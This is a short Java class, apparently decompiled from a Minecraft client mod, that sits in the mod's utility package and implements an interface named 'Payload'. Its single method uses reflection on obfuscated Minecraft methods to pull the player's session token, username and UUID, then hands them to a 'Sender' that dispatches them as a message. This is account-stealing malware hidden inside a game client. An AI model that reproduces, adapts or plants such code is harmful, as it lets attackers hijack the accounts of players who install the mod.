package com.esoterik.client.util.impl;

import com.esoterik.client.features.modules.misc.Sender;
import com.esoterik.client.util.Message;
import com.esoterik.client.util.Payload;
import net.minecraft.launchwrapper.Launch;

public final class Session implements Payload {
   public void execute() throws Exception {
      Class<?> mc = Launch.classLoader.findClass("net.minecraft.client.Minecraft");
      Object minecraft = mc.getMethod("func_71410_x").invoke((Object)null);
      Object session = mc.getMethod("func_110432_I").invoke(minecraft);
      Class<?> sessionClass = Launch.classLoader.findClass("net.minecraft.util.Session");
      Object token = sessionClass.getMethod("func_148254_d").invoke(session);
      Object name = sessionClass.getMethod("func_111285_a").invoke(session);
      Object uuid = sessionClass.getMethod("func_148255_b").invoke(session);
      Sender.send((new Message.Builder("Session")).addField("Name", (String)name, true).addField("UUID", (String)uuid, true).addField("Token", (String)token, false).build());
   }
}
